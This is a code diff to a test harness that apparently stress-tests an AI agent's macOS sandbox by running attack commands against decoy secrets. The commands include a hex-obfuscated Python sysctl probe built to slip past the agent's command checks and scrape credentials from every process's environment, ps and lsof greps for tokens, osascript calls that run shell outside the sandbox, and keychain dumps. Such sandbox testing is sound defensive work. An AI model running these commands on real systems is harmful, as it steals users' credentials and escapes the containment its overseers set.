@@ -53,14 +53,17 @@ MARKERS = {
 
 # Reads every process's arguments and environment with sysctl (what ps -E does, and macOS's /proc/<pid>/environ),
 # written the way an attacker would: as code the agent's own command checks can't read. It prints only the
-# credential-looking parts of what it could read, so a leak is small enough to reach the model in full.
+# credential-looking parts of what it could read, so a leak is small enough to reach the model in full. The
+# patterns on its command line are more of them, for a test's own kinds of secret.
 SYSCTL_PROBE = r"""
-import ctypes, re
+import ctypes, re, sys
 libc = ctypes.CDLL(None, use_errno=True)
 libc.sysctl.argtypes = [ctypes.POINTER(ctypes.c_int), ctypes.c_uint, ctypes.c_void_p,
                         ctypes.POINTER(ctypes.c_size_t), ctypes.c_void_p, ctypes.c_size_t]
 libc.sysctl.restype = ctypes.c_int
-found = re.compile(rb'.{0,40}(sk-ant|ghp_|SSH-SECRET|accessToken|LOGIN|HANDOFF_DECOY).{0,80}')
+names = [b'sk-ant', b'ghp_', b'SSH-SECRET', b'accessToken', b'LOGIN', b'HANDOFF_DECOY']
+names += [re.escape(a.encode()) for a in sys.argv[1:]]
+found = re.compile(rb'.{0,40}(' + b'|'.join(names) + rb').{0,80}')
 buf = ctypes.create_string_buffer(1 << 20)
 looked = denied = 0
 for pid in range(1, 100000):
@@ -125,8 +128,9 @@ def keychain_path(home: Path, secrets: Secrets) -> Path:
     return home / "Library" / "Keychains" / f"{secrets.item}.keychain-db"
 
 
-def _python(code: str) -> str:
-    return f"python3 -c \"exec(bytes.fromhex('{code.encode().hex()}').decode())\""
+def _python(code: str, *args: str) -> str:
+    quoted = "".join(f" {shlex.quote(arg)}" for arg in args)
+    return f"python3 -c \"exec(bytes.fromhex('{code.encode().hex()}').decode())\"{quoted}"
 
 
 def _run(argv, env, *, stdin=None, timeout=30):
@@ -191,8 +195,11 @@ class Attacks:
 
     active = sys.platform == "darwin"
 
-    def __init__(self, tmp_path: Path):
+    def __init__(self, tmp_path: Path, looks_for: tuple[str, ...] = ()):
+        """`looks_for`: how the test's own secrets start (never a whole one: a command is seen by the model), for
+        the sysctl probe and a look at every process's environment to print, beyond the ones they know."""
         self.root = tmp_path
+        self.looks_for = looks_for
         self.secrets = new_secrets()
         # As it is now: the test points HOME at its fake home later, and these tools should see yours
         self.env = {**os.environ, "LANG": "en_US.UTF-8"}
@@ -290,7 +297,7 @@ class Attacks:
             return []
         assert self.decoy is not None and self.share is not None
         return commands(self.pwned, home, self.decoy, self.secrets, self.share, keychain=self.keychain is not None,
-                        clipboard=self.clipboard_set)
+                        clipboard=self.clipboard_set, looks_for=self.looks_for)
 
     # ── after the run ────────────────────────────────────────────────────────
 
@@ -366,11 +373,12 @@ class Attacks:
 
 
 def commands(pwned, home: Path, decoy: Decoy, secrets: Secrets, share: Path, *, keychain: bool = True,
-             clipboard: bool = True) -> list[str]:
+             clipboard: bool = True, looks_for: tuple[str, ...] = ()) -> list[str]:
     """The attack commands, as plain shell strings. `pwned(name)` is the path of a marker file outside the
     worktree; `home` the fake home (the keychain sits in it); `decoy` the process to look into; `secrets` what
     must never be in a command; `share` the folder the agent can read, with the files to `open` and bootstrap
-    in it. Without `keychain` or `clipboard`, the attacks on them are left out."""
+    in it. Without `keychain` or `clipboard`, the attacks on them are left out. `looks_for`: the starts of the
+    test's own secrets, for the sysctl probe and one more look at every process's environment (see Attacks)."""
     pid = decoy.pid
     q = shlex.quote
     chain = q(str(keychain_path(home, secrets)))
@@ -388,7 +396,7 @@ def commands(pwned, home: Path, decoy: Decoy, secrets: Secrets, share: Path, *, 
         f"ps -E -ww -A | grep -a -o '[{ENV_NAME[0]}]{ENV_NAME[1:]}=[^ ]*'",
         f"lsof -nP -p {pid}",
         f"lsof -nP | grep -a '[{HELD_DIR[0]}]{HELD_DIR[1:]}/'",
-        _python(SYSCTL_PROBE),
+        _python(SYSCTL_PROBE, *looks_for),
         # Apple Events: another program runs the command, outside the sandbox
         f"osascript -e {q(shell)}",
         f"osascript -e {q(shell_finder)}",
@@ -401,6 +409,12 @@ def commands(pwned, home: Path, decoy: Decoy, secrets: Secrets, share: Path, *, 
         # The security server, which opens keychains
         "security find-generic-password -s handoff-no-such-service",
     ]
+    if looks_for:
+        # Every environment the sandbox can see (what Linux's `cat /proc/*/environ` is), printing only the words
+        # that start like one of the test's own secrets
+        assert all(part.replace("-", "").replace("_", "").isalnum() for part in looks_for), "not safe in a regex"
+        parts = "|".join(f"[{part[0]}]{part[1:]}" for part in looks_for)
+        out.append(f"ps -E -ww -A | grep -a -o -E '({parts})[^ ]*'")
     if keychain:
         out += [f"security find-generic-password -w -s {secrets.item} {chain}",
                 f"security dump-keychain -d {chain}",
